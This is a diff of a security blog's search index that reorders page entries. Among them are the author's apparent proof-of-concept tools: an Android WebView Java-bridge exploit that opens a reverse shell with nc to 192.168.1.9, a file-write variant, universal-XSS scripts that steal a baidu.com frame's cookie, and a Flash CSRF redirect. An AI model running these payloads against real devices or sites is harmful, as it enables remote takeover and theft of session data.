@@ -1057,9 +1057,19 @@
     <content type="text"></content>
   </entry>
   <entry>
+    <title><![CDATA[404 Not Found：该页无法显示]]></title>
+    <url>%2F%2F404.html</url>
+    <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[Categories]]></title>
     <url>%2Fcategories%2Findex.html</url>
     <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[友情链接]]></title>
+    <url>%2Ffriends%2Findex.html</url>
+    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog]]></content>
   </entry>
   <entry>
     <title><![CDATA[search]]></title>
@@ -1070,21 +1080,6 @@
     <title><![CDATA[Tags]]></title>
     <url>%2Ftags%2Findex.html</url>
     <content type="text"></content>
-  </entry>
-  <entry>
-    <title><![CDATA[404 Not Found：该页无法显示]]></title>
-    <url>%2F%2F404.html</url>
-    <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[友情链接]]></title>
-    <url>%2Ffriends%2Findex.html</url>
-    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fweibo.html</url>
-    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
   </entry>
   <entry>
     <title><![CDATA[Tools]]></title>
@@ -1098,13 +1093,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2FflashCSRF%2Findex.html</url>
-    <content type="text"><![CDATA[document.location = 'ContentHijacking.html';]]></content>
+    <url>%2Ftools%2Fweibo.html</url>
+    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+    <url>%2Ftools%2FflashCSRF%2Findex.html</url>
+    <content type="text"><![CDATA[document.location = 'ContentHijacking.html';]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1118,6 +1113,16 @@
   </entry>
   <entry>
     <title></title>
+    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
     <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
@@ -1125,10 +1130,5 @@
     <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
     <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
   </entry>
 </search>
